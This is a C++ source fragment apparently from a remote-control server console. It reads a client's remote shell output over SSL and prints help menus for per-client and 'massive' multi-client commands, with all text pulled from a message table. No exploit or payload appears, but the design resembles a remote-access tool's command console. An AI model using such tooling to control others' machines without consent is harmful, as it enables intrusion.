void Server::threadRemoteCmdOutput(int iClientID){
	char cCmdBuffer[1024];
	int iBytes = 0;
	while(isReadingShell){
		if(Clients[iClientID] != nullptr){
			memset(cCmdBuffer, 0, 1024);
			iBytes = SSL_read(Clients[iClientID]->sslSocket, cCmdBuffer, 1023);
			if(iBytes > 0){
				cCmdBuffer[iBytes] = '\0';
				if(strncmp(cCmdBuffer, CommandCodes::cShellEnd, strlen(CommandCodes::cShellEnd)) == 0){
					std::cout<<Misc::Msg(74);
					isReadingShell = false;
					break;
				}
				std::cout<<cCmdBuffer;
			} else if(iBytes == -1){
				std::cout<<"Socket error\n";
				error();
				break;
			}
		} else {
			std::cout<<Misc::Msg(75);
			break;
		}
	}
}

void Server::Help(const std::string strHelp, int iOS){
	std::vector<std::string> vHeaders, vFields;
	if(strHelp == "main"){
		std::cout<<Misc::Msg(109);
		std::cout<<Misc::Msg(82);
		std::cout<<Misc::Msg(83);
		vHeaders.push_back(Misc::Msg(84));
		vHeaders.push_back(Misc::Msg(85));
		vHeaders.push_back(Misc::Msg(86));
		vFields.push_back(Misc::Msg(87));
		vFields.push_back(Misc::Msg(88));
		vFields.push_back(Misc::Msg(89));
		Misc::PrintTable(vHeaders, vFields, ',');
		std::cout<<Misc::Msg(90);
		std::cout<<Misc::Msg(91);
		std::cout<<Misc::Msg(92);
		std::cout<<Misc::Msg(93);
		std::cout<<Misc::Msg(94);
		std::cout<<Misc::Msg(95);
		return;
	}
	if(strHelp == "client"){
		std::cout<<Misc::Msg(96);
		vHeaders.push_back(Misc::Msg(97));
		vHeaders.push_back(Misc::Msg(85));
		vHeaders.push_back(Misc::Msg(98));
		if(iOS == 1){
			vFields.push_back(Misc::Msg(99));
			vFields.push_back(Misc::Msg(100));
			vFields.push_back(Misc::Msg(101));
		} else {
			vFields.push_back(Misc::Msg(102));
			vFields.push_back(Misc::Msg(103));
			vFields.push_back(Misc::Msg(104));
		}
		vFields.push_back(Misc::Msg(105));
		vFields.push_back(Misc::Msg(106));
		Misc::PrintTable(vHeaders, vFields, ',');
		std::cout<<Misc::Msg(110)<<"\n";
		return;
	}
	if(strHelp == "massive"){
		vHeaders.push_back(Misc::Msg(97));
		vHeaders.push_back(Misc::Msg(85));
		vHeaders.push_back(Misc::Msg(98));
		vFields.push_back(Misc::Msg(107));
		vFields.push_back(Misc::Msg(108));
		Misc::PrintTable(vHeaders, vFields, ',');
		std::cout<<Misc::Msg(110)<<"\n";
		return;
	}
}

//beej guide network programming
void *get_int_addr(struct sockaddr *sa){
	if(sa->sa_family == AF_INET){
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}
	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
